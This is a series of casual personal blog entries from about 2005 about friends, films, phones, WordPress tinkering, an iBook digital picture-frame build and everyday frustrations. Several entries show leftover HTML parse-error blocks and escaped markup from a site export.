                <p>Lots and lots of writing has taken place. it is pretty nuts. i have been blogging since march 1st 2000. it is pretty nuts. A lot of words. a lot of randomness. a HUGE number of rants and a couple emotions. hah. mostly just drivel. it rules. Since 2000 i have had two jobs, hosted probably 200 websites, gone to the grocery store maybe 50 times, read hundreds of books, had 7ish girlfriends, learned to speak italian, graduated from college, and ran around naked. I think the best thing that has come about due to my love of blogging is all the blogs i have hooked people up with or proselytized people into getting. two of my favorites are <a href='http://nata2.info/?path=pictures%2Ffamily&img=dylan_walkman.jpg'>dylans</a> <a href='http://www.dylanreed.org/'>blog</a> and <a href='http://nata2.info/?path=pictures%2Ffamily&img=jon.jpg'>jons</a> <a href='http://in5anity.org/'>blog</a>. I think i like these cuz they are my closest of close friends and they often times both fall away from me - and with the blog i am able to see whats going on.. With dylan, i was able to see when he got <a href='http://www.dylanreed.org/2002/03/24/engaged/'>engaged</a> and with jon i get to see his <a href='http://in5anity.org/?p=7'>travels</a>. it rules. i think blogs really are fun. i like the internet.</p>

<p>check out <a href='http://www.wretch.cc/album/pzella'>ella's</a> new pictures.</p>

<p>heh. our <a href='http://www.riottech.net'>search engine optimization blog</a> is pretty cool.. unfortunantly it is listed as an entertainment site in googles mind - so all the ads and such come up as &#8220;come visit the ritz. totally lame.</p>

<p>matiss and i have a juggling gig tomorrow night. it shoudl be fun. we are making fliers and such. heh. w00t marketing.</p>

<p>tonight i am going to finish my secret plan. oh and my <a href='http://harperreed.org/resume'>resume</a>. hah.</p>

                <p>So i was chilling in phoenix and i called my dad. i told him that i wanted to make a website for my grandfather and that my mom and dad should start scanning pictures - or send them to me to scan. and my dad was like.. umm why don&#8217;t you come out here and do it this weekend. he then offered to pay airfare ;) so i purchased some tickets and flew to Colorado. got in Friday. my mom was at some conference in Cheyenne so she wouldn&#8217;t know i was here until she got home on Saturday. which left Friday night and Saturday day to my father and i&#8217;s own devices. So we went and purchased a scanner and started ripping it up on the pictures. <a href='http://nata2.info/?path=pictures%2Ffamily'>i scanned about 200 pictures in</a>. it takes soooo long. it is rather annoying.</p>

<p>so anyway. i found this old comic my dad made for me - so i took it and webified it and posted it to the internet. check it out: <a href='http://www.fastmilo.com'>fast milo</a>. rule.</p>

<p>Then on Sunday i woke up to a<a href='http://nata2.info/?path=pictures%2FIncoming&img=colorado_radar_041005.jpg'> HUGE snowstorm</a>. all of Denver is closed. power is out all over the front range, United <a href='http://www.ua2go.com/flifo/FlightSummary.do?date=&deparr+value%3D=&time=&Check=&orig=&dest=&fs_type=Number&fltNbr=1458'>stopped flying</a> until Tuesday and i am totally stranded. the next available flight is on Tuesday. sad sad day. but whatever. more time here.</p>

<p>so rather than go to the airport i got a bunch of stuff done on my grandfathers site: <a href='http://oldvd.org'>oldvd.org</a>.</p>

<p>now on to world domination.</p>

<p>i am gunna have to do laundry</p>

                <p>the weather here is excellent. i likey. work is fun. the environment here is much more &#8220;low-key&#8221; than in chicago. the people are just as nice but everyone seems so much more chill. it is a great work vacation. i think they should send everyone here to recooooop. it rules. oh and it is really nice out. just yesterday i got sunburned. which isn&#8217;t exactly hard for me - since i get color walking to the train. but i immediately invested in sunscreen.</p>

<p>i NEED to move somewhere warm. why do i live in chicago - so so so dumb. maybe cali. maybe colorado. i will live in my parents basement. haha. oh yea. i will rule.</p>

<p>i am supposed to see meghan soon. that will be fun. and then i will be going back. ahh sad.</p>

<p>a bit of humor - my boss and i were working on my laptop and she reached across my computer and accidently spilled my water onto my laptop keyboard. around 4-5 oz of water. rule. it immediately turned itself off. now the IT guy is in the process of &#8220;magicianing&#8221; it back to life.</p>

<p>water + laptop == no good.</p>

<p>i know it isn&#8217;t as good as story as tim&#8217;s beer laptop. but it is the least i coudl do ;)</p>

                <p>oh yea. so stability, unrest and insanity are all ways to describe my current feelings. basically nothing is making sense and everything is all screwed up.</p>

<p>the new zealand people are at it again - or something. LAME. and super super annoying. i hate money.</p>

<p>i think i am about to go through some rather large changes. it should be interesting. and retarded. i am not excited. well wait i am excited - but i wish that i was in control rather than not in control.</p>

<p>this weekend was fun. on friday i played nerd with andy. we will have cool stuff soon. i hope. i also hung out with elisa. it ruled. then i did my taxes. stupid taxes. then i slept. forever. or at least a rather long time.</p>

<p>i then went to XO with claudia, john, todd and mark. it is an excellent resturant. tapas style. jordan is a server there and marco is the GM. so it was a star studded night. it was john&#8217;s anniversary party at redno - so we went and hung out. lots and lots of fun. so many hot girls. heh. and good music and fun dancing. then we went to crobar - where there were these crazy muscle dudes dancing. hilarious. totally straight and acting incredibly &#8220;mister leather.&#8221; heh. it ruled.</p>

<p>btw. i HATE the forward and backward keys on the ibm thinkpad keyboard. it almost killed this entry. i remember a javascript cookie-ish plugin/hack for squirrelmail that would allow you to recover a saved entry. basically i think that it executed a function that woudl store the contents of your textarea into a cookie on every keypress in said text area. it would then kill this var if you completed the entry/email. this woudl allow it to pop up a dialog and restore an interupted email. it ruled. it also disappeared. i don&#8217;t know why. heh.</p>

<p>i am gunna need a new laptop. and i am gunna need some other stuff.</p>

<p>i am going to pheonix on tuesday.</p>

                <p>so this weekend i hung out a lot. it was awesome. i came home from work early on friday (holiday) and hung out with matt and hiromi. we went and got beers, pop, cheese and thai food. then we watched <b><a href='http://imdb.com/title/tt0386005/?fr=c2l0ZT1kZnxteD0yMHxsbT01MDB8dHQ9b258ZmI9dXxwbj0wfHE9bmV3IHBvaWxjZSBzdG9yeXxodG1sPTF8bm09b24_;fc=1;ft=20;fm=1'>new poilce story</a></b>. so so good. it was about jackie chan - a screwed up sad sad cop and this punk kid who ruled. they get together and fight this gang of rich kids. it is hilarious and sad and awesome. incredible action movie. so good.</p>

<p>then after that - matt and i went to his friend dewaynes house with edie and then to the openend gallery to watch icy demons (i need some of their music) and then i left. went to rainbow and hung out. there were these really cute girls talking about cell phones. like phone nerds. it was killing me. heh. then i met jordan and we went to Y bar. then sound bar. then crobar. then exit. then tacos. and a hot-dog somewhere in there. hehe. tooo much money was spent. then sleep.</p>

<p>on saturday i just played around with my newish site: <a href='http://www.ituners.com'>ituners.com</a>. it is going to be a communityish group where people can post what they are listening too. it will also allow people to post tags and such. but the main thing it will do is allow people who use blogger and typepad (or any thing that isn&#8217;t php friendly) to use and post itunesblogger. it shoudl be interesting. then maybe some tricks to tag the music (which would have to be interesting - either a &#8220;new&#8221; id3 tag (which would suck) or using the comments tag (which also could suck) (andy i need your help here)). but either way things turn out. currently i wrote most of the site code, and the posting piece and the javascript usercode piece and i am almost done with the RSS feed of a users music. i want to win.</p>

<p>google ads make it worth making fun sites.</p>

<p>i am currently trying <a href='http://ranchero.com/marsedit/'>marsedit</a> - much better than <a href='http://ecto.kung-foo.tv/'>ecto</a> or <a href='http://zempt.com/'>zempt</a>. which is sad. i wanted to be cool like <a href='http://boingboing.net/'>boing boing</a> and use <a href='http://ecto.kung-foo.tv/'>ecto</a>. the only problem i see is that nothing supports the custom tags that wordpress uses - so i am unable to incorporate my tagging system into these fancy tools. i imagine i will have to haxor my xmlrpc.php apart to make it work. but that just seems like a PAIN in the ass. stupid asses. stupid pain.</p>

<p>Easter was nice. all i did was fix my friends computer and then had an excellent dinner with hiromi, valentina and art. it was good. at a place called <a href='http://metromix.chicagotribune.com/search/64684,0,2653845.venue'>meiji</a>. so good. then we came back to my place and watched <b><a href='http://imdb.com/title/tt0373074/?fr=c2l0ZT1kZnxteD0yMHxsbT01MDB8dHQ9b258ZmI9dXxwbj0wfHE9a3VuZyBmdSBodXN0bGV8aHRtbD0xfG5tPW9u;fc=1;ft=21'>kung fu hustle</a></b>. it was hilarious. not quite as good as shoalin soccer - but excellent. some really funny situations. ahh&#8230; i love kung fu. i really want to see <a href='http://imdb.com/title/tt0212712/?fr=c2l0ZT1kZnxteD0yMHxsbT01MDB8dHQ9b258ZmI9dXxwbj0wfHE9MjA0NnxodG1sPTF8bm09b24_;fc=1;ft=20'>2046</a>. but first.. <a href='http://imdb.com/title/tt0118694/?fr=c2l0ZT1kZnxteD0yMHxsbT01MDB8dHQ9b258ZmI9dXxwbj0wfHE9aW4gdGhlIG1vb2QgZm9yIGxvdmV8aHRtbD0xfG5tPW9u;fc=1;ft=20'>in the mood for love</a>. stupid love. stupid wong kar wai. heh. so beautiful.</p>

<p>i love pictures. this weekend i played a bit with <a href='http://www.flickr.com'>flickr</a>. really incredible. it is so nice that they are successful. not really surprising since it is an incredible product. my friend ella <a href='http://www.wretch.cc/album/show.php?i=pzella&amp;b=3&amp;f=1107362562&amp;p=8'>(the one on the right)</a> uses this site called <a href='http://www.wretch.cc/album'>wretch.cc</a>. it seems pretty good. and is really fun to crawl through. obviously not much of it is in english - but there are a lot of really ridiculous pictures. mostly of ladies and cars. i have no idea why there are sooo many ladies and cars.</p>

                <p>so i was hanging out at work. and i decided to check up on some blogs as a pat on the back for doing good work - and i checked this <a href='http://troubador.typepad.com/amorous_troubador/'>blog </a>i read of this women who went to <a href='http://cornellcollege.edu'>cornell </a>and was an aquaintence of mine and friends or my friends.. anyway.. on her blog there was a mention of a friend of mine from college who i had lost touch with - <a href='http://www.imdb.com/gallery/hh/1742061/HH/1742061/iid_890186.jpg?path=pgallery&path_key=Hershey,%20Portis'>cecil </a>- who is apparently working in <a href='http://www.imdb.com/name/nm1742061/'>film</a>. hah. rule. it is so funny. especially because his name is portis hershey - which is what he told me once was the name he was going to use when he was famous. haha.</p>

<p>i always wondered what happened to cecil. now i know. ;)</p>

<p>here is a <a href='http://people.cornellcollege.edu/m-myers/PortisHershey.htm'>webpage about cecil</a> from my college.</p>

<p>the internet rules. i gotta go rent extreme dodgeball now.</p>

                <p>I got all my movies last night. i had ordered a bunch: <a href='http://imdb.com/title/tt0405821/'>casshern</a>,<a href='http://imdb.com/title/tt0118694/'> in the mood for love</a>, <a href='http://imdb.com/title/tt0212712/'>2046</a>, <a href='http://imdb.com/title/tt0373074/'>kung fu hustle</a>, <a href='http://imdb.com/title/tt0439884/'>a world without thieves</a>, <a href='http://imdb.com/title/tt0436833/'>colored bloussoms</a>, <a href='http://imdb.com/title/tt0386005/'>new police story</a> and old boy. i am pretty excited.</p>

<p>i went ahead and watched casshern. it is incredible. one of the weirdest movies i have seen in awhile. totally insane. it is about this dude who dies and then gets reborn - and his arch enemy - a bioexperiment gone wrong. they fight. there are a lot of robots and monsters. and some good fighting. really insane. it is like sky captain of tomorrow mixed with the anime metropolis mixed with city of lost children. totally insane.</p>

<p>some cool stuff happening with <a href='http://www.itunesblogger.com'>itunesblogger </a>in the next couple days. first - we updated itunesblogger to the new version. fixed some bugs and added more wildcard support. exciting. and then we talked about making a itunesblogger community site. and luckily enough i own <a href='http://www.ituners.com'>ituners.com </a>- which will work wonders. i am excited. it will be fun - even if it is just my friends playing.</p>

<p>WEEKEND. today is a half day. so excited. i will probably stay awhiel though. got some work and testing to do. stupid testing. haha.</p>

                <p>so i have been working on wordpress and i decided to upgrade all my friends to wordpress. so i did <a href='http://www.proxientunit.com'>mike's</a>, <a href='http://www.mimiblume.com' title='miriams'>miriams</a>, <a href='http://www.dylanreed.org' title='Dylan&apos;s'>Dylan's</a>, <a href='http://www.danielleclock.org/blog/'>danielles</a> and &lt;A href=&#8221;http://www.mikecompton.com/blog/&#8221;&gt;comptons&lt;/a&gt; and soon i will get Matiss&#8217;s and Thom&#8217;s.</p>

<p>hopefully this will rule - we could have a huge trackback club. and more people will se our blogs. MORE MORE MORE. then i will have to make <a href='http://blogs.nata2.org'>blogs.nata2.org</a> fancy. i imagine i will attempt to use javascript and ajax to make it rule. making a comment subsystem. but more importantly - a way to load up each users who rss feed under their entry. i love the Internet. if i only had about 12 more hours in my day ;)</p>

<p>so. i am thinking of writing a <a href='http://www.phpmvc.net/'>PHP, MVC</a>, <a href='http://smarty.php.net/'>SMARTY</a> (maybe with XSL, XML) cms. just something real real real simple. something that could power anything from <a href='http://www.weownthesun.com'>weownthesun</a> to <a href='http://www.filaphilia.com'>filaphilia</a> to <a href='http://www.tommiesunshine.org'>tommiesunshine.org</a>. just something awesome. awesome and simple. i am tired of using <a href='http://www.movabletype.org'>played out blog software</a> to power my sites. i need something that will generate pages - be easy to expand and will make design simple as hell. i think with the proper motivation this could also be commercially viable. w00t. don;t get me wrong however. i really like <a href='http://www.mamboforge.com'>mambo</a>. however. it is too big for a lot of sites and i don&#8217;t want unnecessary complications.</p>

                <p>So i have been ordering from <a href='http://www.hivizone.com'>hivizone</a>, a hong kong asian cinema store, for about 4 years now. and they send via speedpost - which eventually turns into <a href='http://www.usps.com'>USPS</a>. well. goddamn USPS always makes receiving packages a nightmare. so for the second time in the last six months i have placed an order with hivizone and USPS leaves an attempt of delivery notice. So i fill it out appropriately and leave it. The carrier then refuses to acknowledge it - and will either leave another one or just send my package back to hong kong. OMG. it kills me.</p>

<p>so anyway. they finally take my filled out sheet and they make another attempt of delivery today. and they don&#8217;t leave the package in the entryway as instructed and they leave ANOTHER NOTICE.</p>

<p>WTF. omg. it seriously makes me so mad. this is not a point at which my patience are cool. i wish it was all done with UPS or fedex. i NEVER have problems with them. i imagine that is mostly my carrier (they often bend mail, and force magazines into the smallest possible spots. it kills me. KILLS) they probably just don&#8217;t care. and it is easier for them to just fuck with me than it is for them to do their job.</p>

<p>EEk. haha. i will now relax. and work.</p>

<p>Ecto is also killing me. it doesn&#8217;t really work.</p>

                <p>I am testing using ecto to post to wordpress. if this works i will probably purchase ecto. I really feel like i am desecrating all that is holy by using wordpress. for some reason i feel that writing all my own software is the way to go - although this is really nice and fancy. i do like the features. but i hate some of the more commercial parts. stupid commercial.</p>

<p>last night ruled. i love me some Ethiopian food. so so good.</p>

<p>how nice. spell check.</p>

<p>doh! it didn&#8217;t work</p>

<p>Try two! W00t. it worked. ok. now i have made posting to my blog super super easy. i have NO excuse not to post. i guess i need to register this. or something. ;) except.. it doesn&#8217;t actually work. heh.</p>

I am crazy. we hung out. he was giving me a ride home and he got pulled over. he may or may not have been driving crazy. I don&#8217;t know. however we got pulled over. the cops pulled their guns and told us to get out with our hands up. we both did. they made us get out and they searched us rather throughoughly. (that is spelled horribly). and then they handcuffed us together. and then they yelled a bunch and acted tough. then they let us go. <br /><br />afterwards I realized that they stole all the money that was in my wallet. it wasn;t much. only about 60 dollars. but still wtf. they stole abotu 120 from my friend. it is insane. I have never been shook down. I guess now my chicago cop experience is compelete. hahahah. or wait.. mwahahaha. soemthing like that. insane. totally totally insane. <br />wtf <br />i am going to sleep a bunch now. and&#8230; cry myself to sleep. I was at a party tonight iwht hilary duff. hahaha. and corey feldman. so dumb. I hate celebraties. bceauase hey are less than real humans. they are like 1 demensional humans. whereas we are barely 2 demonsional. heh. <br /><br />my blog will look pretty soon. like a magician.</p>

I assumed it was just going to be friends. but they decorated the walls and everything. it ruled. I was
happy. and then they brought out a cake that my parents had provided. magically of course. it was nice.

                <p>I am rather sleepy. tonight/today was good. I coded all day in anticipation of my new tool being released. I am excited. unfortunantly all my work is going to be looked at as sketchy - cuz the competitor released their &quot;upgrade&quot; which is significantly better than what they had, and rather similar to what I have done. doh! I guess I have to redo and make mine a lot better. ahh.. innovation. I am excited however.. it is a lot of fun. <br />
</p><p>I made this: <a href='http://nata2.info/?path=code%2Fcode_drop&text=HTTPget.cs'>HTTPget.cs</a></p>
<p>Maybe you can use it in an app that crawls websites that require cookies - or spiders things. it is really fancy. I will update the header so it isn&#8217;t SOOO ghetto in a bit. currently my priority is sleep. &lt;/p&gt;<p>stay tuned for the release of  <strong>CrockODolla Hunter</strong>. ahahahahja&nbsp;</p></p>

I saw lots of cool friends. sadly tomorrow is work. <br /><br />hey all my far away friends (i.e. bec, <a href='http://www.mimiblume.com/' target='_self'>miriam</a> and <a href='http://home.kimo.com.tw/pzantique/' target='_self'>ella</a>) I am now on <a href='http://www.skype.com/' target='_blank'>skype</a> - you should &quot;skype me&quot; - or call - or whatever. I hooked my bluetooth headset up to my mini mac and now have a fanciful &quot;voipish&quot; internet phone. unfortunantly no one can call me. but I can call anyone else. ;) haha. rule. if this works well. I may end up purchasing one of those fancy skype phones. this way everyone can make long distance calls from here. it could/should rule.</p>

                <p>So on new years day i got a little carried away and got my Nokia 6600 wet. The joystick immediately stopped working and all hell broke loose. i was unable to do anything fancy like call or text. it was so annoying. so i got out my nifty little Sony-Ericcson t610 and continued my day. luckily mightysync worked for me and i didnt lose any number nor was i down for any time. however - i was totally used to using the Symbian phones and i needed to fix my 6600. The first thing i did was take it apart. that did not work. it just made things worse. so i gave up, used the little minature phone i had and went on my way. of course i coudlnt help but looking for other cell phones. i decided after about 3 days to go and pick up a nokia 7610.</p>

<p>I went to devon and picked one up at this place called oversees electronics. it rules. i really like it. not only is it super fancy and cool looking - but it is quite a bit faster than the 6600. it also feels better. the keypad is kinda weird and i constantly have trouble with the * key. but other than that it rules. i really enjoy it.</p>

<p>the muvee software is quite something - my friends all enjoy me sending them fucked up movies that make no sense at all. i enjoy it as well. it cracks me up.</p>

<p>one thing that is super annoying is that i am unable to sync with iSync. wtf apple. i mean seriously. it isnt that hard to support native syncml in your syncml application. hah. stupid mrouter. i am gunna punch nokia when i see them on the street. other then the syncing issues (which should get resolved in tiger - meh) i really like the phone. love actually.</p>

I was able to <a href='http://www.ironkungfu.net'>document them</a> and hopefully will be playing with them more in the future. <br /><br />i need much much better money management skills. stupid stupid stupid money.</p>

                <p>check it out. the first step: <a href='http://www.yeknominc.com'>yeknom industries</a>. w00t. you will have to wait until later to see what comes next. <br /><br />being so busy I have barely had enough time to notice the insanely smart people who &#8220;hang&#8221; on the internet. basically I mean.. google employees. heh. for some starters - <a href='http://massless.org'>Chris Wetherell</a> seems to be quite something. it is lovely to see good design in a tech setting. I need to redesign my site. really bad. maybe I will start now. I think I will. hah. brb. <br /><br />the problem is that I don&#8217;t really want to use my cms - or any of the others out their. so annoying. haha. I want the blog entries to just come from my brain. maybe I will use wordpress. it is php. and it isn&#8217;t the EVIL EVIL cgi that has been plagging my poor server (stupid comments - bastards be killing my shit :P). the next questions (after cms) is whether I should have comments or not. if you have any suggestions.. let me know. maybe then I will be excited to talk about more things. I can combine all my blogs, drop about 15 domains - and BAM. richer. sounds good. <br /><br />then I will be the winner. <br /><br />i want to visit taiwan. and then travel. want want want. dang. I guess I can&#8217;t have it all. <br /><br />i am working on a new sleep schedule: 4-5hrs sleep at night, 8-10hrs awake, 3-4hrs sleep then 3-4hrs awake. if you notice it adds up to one day. it is hard though. haha. it is basically what I practice now - but I was thinking about ripping it up. haha.</p>

I brought a fancy knife that I use to open things like apple computers, I brought a couple dual headed screwdrivers. and I brought a camera. I am ready t welcome the little guy into the new world. this has brought me to start thinking how silly the things I carry on my person are. so I decided that I woudl catalog everything that I carry on my person on the way to work. here it is: <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML:

<p>So yea. that is what I carried to work. I don&#8217;t carry a bag or anything. I just stuff my pockets. I probably look like a dork. but who cares. <br /><br />so I am going to throw out their a smallish gripe. ever since I got the 7610 I have been really happy with my phone - however. it is a pain in the ass to upload pictures. because the pictures are ~1mp so they are a lot larger than I am used to. but it will take a good 15-20 minutes to upload a few pictures. sooooo annoying. <br /><br />if it was faster I would be posting pictures of my fancy new mac mini that came while writing this post ;).</p>

I appreciate how minimal apples packaging is. although - it has become rather <a href='http://nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fnokia_7610%2F200120051002&img=Nokia7610%28041%29.jpg'>predictable</a>. but is that bad? predictable packaging. <a href='http://nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fnokia_7610%2F200120051002&img=Nokia7610%28043%29.jpg'>it</a> is not very big. <a href='http://nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fnokia_7610%2F200120051002&img=Nokia7610%28044%29.jpg'>i like the back</a>. and I dislike the gargantuan <a href='http://nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fnokia_7610%2F200120051440&img=Nokia7610%28047%29.jpg'>powe supply</a>. so dumb. &#8230;<br /><br />more pictures laters. <br /><br />oh oh oh. and the suck of it all is that osX doesn&#8217;t support my fancy pants nokia 7610. stupid apple. haha.</p>

I really can&#8217;t do it yet. soon. then video. then RULING?! <br /><br />there is a HUGE juggling convention this weekend. but I am sadly going to have to stay home nad work. it sucks. stupid work. always getting in the way. I am going to punch it. right in the head. PUNCH PUNCH PUNCH. <br /><br />i picked up a surprise. I have been looking for a computer to manage my contacts, my business and everything. so I was going to buy a shuttle and just tuck it in the corner. but then I was like. WHY! oh WHY! would I get a pc when I hate them. hahah. so instead I picked up a &lt;A href=&#8221;http://www.apple.com/macmini/&#8221;&gt;mac mini&lt;/a&gt;. it has quicken. has bluetooth. and has wifi. so I can place it in the corner. and it will suck my phone&#8217;s soul. manage my finances and basically just play well with others. I am pretty happy about it. <br /><br />i will also be happy when my project is over. <br /><br />love.</p>

                <p>i haven&#8217;t really been blogging like I should. eh.. I get annoyed with it. so I don&#8217;t do it. and then my friends and family contact me and yell. haha. so then I start again. heh. a &#8220;never ending&#8221; cycle of horror. heh. eh.. it isn&#8217;t so bad. I don&#8217;t really mind it. I just haven&#8217;t had all the extra time in the world. only about half of all the extra time. <br /><br />speaking of extra time. I have basically just watched movies for the past 4 days. I watched: 2010 space odyssy, return of the king, total recall, anchor man, the man with two brains, the toy, close encounters of the third kind and dusk til dawn. seriously I don&#8217;t have any free time. haha. <br /><br />i also spent quite a bit of time programming my microcontroller learning kit. hah. I picked up a basic stamp 2 &lt;A href=&#8221;http://www.parallax.com/detail.asp?product_id=28158&#8221;&gt;homework board&lt;/a&gt; and a bunch of LEDs from radio shack. I made a couple neat things. basically just experimented with the board and programming in basic to control stuff. I forgot how to do electronics - but it is all coming back to me. I think I am going to get a &lt;A href=&#8221;http://www.parallax.com/javelin/index.asp&#8221;&gt;javelin&lt;/a&gt; stamp next. ahh.. java. I am hopeing to be able to do some amount of threading - but I have no idea. I think I might be better off with <a href='http://www.reflections.co.nz/micro/GettingStarted/PIC-Getting-started.htm'>pic microcontrollers</a> and programming in assembly. I will have to &#8220;experiment.&#8221; luckily there is a multitude of <a href='http://www.emanator.demon.co.uk/bigclive/makendo.htm'>things to make and do</a>. now if I coudl only get funding. <br /><br />lately I have also been working on making a couple sites that have been in the back of my mind for the last month. I have almost completed them . I wish them all to be done. DONE. I say. you shoudl check some of them out soon. hahah. not now though.<br /><br />tv on the radio is a good band currently.<br /><br /> i should get back to doing real work. haha. <br /><br />i had so much more to say.. but I forgot. <br /><pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;ohoh. house of flying daggers is an incredible movie. very very good. &lt;br /&gt;&lt;br /&gt;i am hungry. </pre></p>

<p>I have always wanted a digital picture frame. I originally thought that the <a href='http://www.audreyhacking.com'>audrey </a> would fulfill my need - but it became apparent that i needed something much more powerful. I needed something that i could manage remotely and could run reasonable programs on. I needed a technology that would allow me to use open source software to display and manipulate the pictures as well as possible. I thought of using a custom linux solution - but decided that it would be cost prohibitive. I also noticed that there are a handfull of good picture frame tutorials already on the internet - so i checked them out and noticed a really nice powerbook <a href='http://www.applefritter.com/node/view/4971'>hack</a> as well as the <a href='http://www.applefritter.com/hacks/duodigitalframe/index.html'>apple duo</a> hack and got to thinking about my roommates old clamshell ibook sitting in the corner&#8230;</p>
<!--more-->
<p>The clamshell ibook is a good choice because: <ul>
	<li>OSX - it can natively run a lot of the apps i was dreaming about</li>
	<li>Small Form factor - it is already small and can get smaller thanks to Apples brilliant component design</li>
	<li>Good Screen - has a decent screen</li>
	<li>Heat dissipation - doesn't run hot</li>
	<li>Cheap - sub $500</li>
	<li>Ports - has airport(802.11), ethernet, usb and line out all built in.</li>
</ul> So i went to it.</p>

<p>So around christmas time i flew to colorado to be with my family. I brought the remenants of my picture frame project from awhile ago to finish up in my fathers shop.</p>

<p>I shopped around for a frame that would be around 8x10 and would be deep enough to hold the mother board and such with the screen well enough. I thought about doing a custom frame, but i figured out (with dylan&#8217;s help) that it would be prohibitively expensive. I eventually found two box frames that when stacked created enough depth to hold everything well. I then used some braces and some thick foam to hold the motherboard in.</p>

<p>It turned out really well.</p>

<p>here are some <strong>pictures:</strong> <blockquote><img src='http://nata2.info/.thumbnails/pictures/misc/phone_camera/photolog/1080109043-Nokia6600%28010%29.jpg' alt='All the pieces separated out' />All of the pieces separated out and fancilike.</blockquote> <blockquote><img src='http://nata2.info/.thumbnails/pictures/misc/phone_camera/photolog/1080111294-Nokia6600%28012%29.jpg' alt='In a box' />The initial test - in a box.</blockquote> <blockquote><img src='http://nata2.info/.thumbnails/misc/misc_hacking/ibook_picture_frame/IMG_3818.jpg' alt='Ibook Picture Frame' />This is the frame i picked.</blockquote> <blockquote><img src='http://nata2.info/.thumbnails/misc/misc_hacking/ibook_picture_frame/IMG_3815.jpg' alt='Power Connector' />This is where the power connector hooks. I have drilled a hole into the frame. It is an incredibly type fit.</blockquote> <blockquote><img src='http://nata2.info/.thumbnails/misc/misc_hacking/ibook_picture_frame/IMG_3816.jpg' alt='Hard drive and airport card' />Here is a view of the hard drive and airport card.</blockquote> <blockquote><img src='http://nata2.info/.thumbnails/misc/misc_hacking/ibook_picture_frame/IMG_3820.jpg' alt='Booting up' />Booting up</blockquote> <blockquote><img src='http://nata2.info/.thumbnails/misc/misc_hacking/ibook_picture_frame/IMG_3840.jpg' alt='In action' /> The Frame in action</blockquote> So. That is that. For the complete set of pictures check <a href='http://nata2.info/?path=misc%2Fmisc_hacking%2Fibook_picture_frame'>here</a></p>

<p>i made my photo frame ibook work. it rules.

                <p>work is fun. <br /><br />however for the past 12 hours - my sternum has felt like it needed to be &#8220;popped.&#8221; like a back. it sucks. it kinda hurts when I breath.

                <p>so I have been reading the rabbit series of books by john updike. they are pretty good. I started with &#8220;rabbit redux&#8221; and just finished &#8220;rabbit, run&#8221; last night. after I finished &#8220;rabbit, run&#8221; I immediately started &#8220;rabbit is rich.&#8221; anyway. I have been thinking about rabbit and what I like/dislike about him in these books. well I don&#8217;t really like him in &#8220;rabbit, run&#8221; - I think he is obviously the anti-hero, a destroyer; however I do like him in &#8220;rabbit redux.&#8221; he seems like things are happening to him and he is reacting - reacting strangely - but still reacting; whereas in &#8220;rabbit, run,&#8221; rabbit is being a punk. he makes me mad. which I enjoy. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML:

                <p>i think the mix is grave diggaz, front line assembly, himsa, bleeding through and fischerspooner. haha. it rules. it is also a lot better on shuffle. ;) I love mp3s. <br /><br />last night all I did was play video games. I played <a href='http://www.chroniclogic.com/gish/'>gish</a> for about an hour - it is a lot of fun. I enjoyed the motif quite a bit. I do wish it really looked like the still graphics look. I mean I is close - but it coudl be really awesome. it reminds me of the graphics from my favorite tv show ever: <a href='http://www.tvtome.com/InvaderZIM/'>invader</a> <a href='http://www.nick.com/all_nick/tv_supersites/zim/'>zim</a>. and then I played &lt;A href=&#8221;http://www.chroniclogic.com/index.htm?bridgeit.htm&#8221;&gt;Bridge It&lt;/a&gt; for about 45 minutes. so much fun. I love physics. haha. basically it allows you the constructor to build bridges of your wildest dreams. and then drive things across them. I made some crazy bridges - I tell you what. after that little stint as a god I joined my roommates for a quick two games of <a href='http://cube.ign.com/articles/570/570749p1.html'>mario party six</a>. it ruled. <br /><br />i love css. and metal. I love metal more than I love css. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;&lt;br /&gt;this morning sucked. I basically ran around frnatically looking for my winter earrings. I have a pair of amber earrings that my friend mary got me - they are really cool and fit perfectly. however, I apparently lost them and all I can find are these other amber earrings that don&apos;t fit. it sucked. both because I really like having them (memories and all that jazz) and because they don&apos;t get cold like the blistering metal that is currently inhabiting the nation that is my ear lobes. &lt;br /&gt;&lt;br /&gt;now I am off to do work and read comics. and by comics I mean connect to a sql server db and write jsp code. </pre></p>

                <p>on where I left off just a second ago. <br /><br />so anyawy. this weekend was a lot of fun. I did a little bit of christmas shopping - got soem gift0rs for my peeps and my family. stupid money. why is all this shit so expensive. I would elaborate - but that might give away some of the oh so secret secrets I have. and their are many. so many it hurts inside. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;&lt;Br&gt; this weekend I did a lot of random develpment. I played a bunch with my new website: &lt;a href=&quot;http://www.weatherisawesome.com&quot;&gt;weatherisawesome&lt;/a&gt;. I am really annoyed with the weather service though. they are pissing me off with piss poor xml. it is just not easy as it could be. and it could be so so elagant. I basically spent most of yesterday evening pissed as hell at the bastards. omg I was mad. then I cleaned my room (it is now pristene), and then made an xslt that rendered part of the xml (the good part). my guess is that they either have some fancy tricks up their sleeve or they are using some standard that was made years ago and just haven&apos;t fixed/upgraded it. because it suxors bad. I am gunna punch them. I have thought about super stalking one of the developers and calling them and being like &quot;hey why did you do it this way&quot; and if they respond well  - then askingthem for help. yea know. the usual thing. &lt;br /&gt;&lt;br /&gt;in other news - soap rules. I am thinking about writing a location soap server that would return either the zip code from lat/long, or the lat/long from zip or finally, zip codes near a certain zaip code. this could help with some fun locaiton apps. like saying - I am here what is near. and the like. &lt;Br&gt;&lt;br /&gt;i am also hopeing to do some work with soap and itunesblogger. like making it submit via a soap client or whatever. or maybe have it look to ituneshacking to grab the most listened to songs. it could be really cool. &lt;br /&gt;&lt;br /&gt;i love computers - although yesterday I was swearing at every computer ever made. &lt;br /&gt;&lt;br /&gt;i feel empty and hollow inside. &lt;Br&gt;&lt;Br&gt;i am reading the rabbit books by john updike. they are sad. but the sad that I like. where the characters are seemingly dealing with mediocrity in the way they only know how to. it is nice to read. I just finished rabbit redux and am starting rabbit run today and should be on rabbit is rich in a couple days. I like updickes style - although it is sometimes very very dense and I have to shake my head back 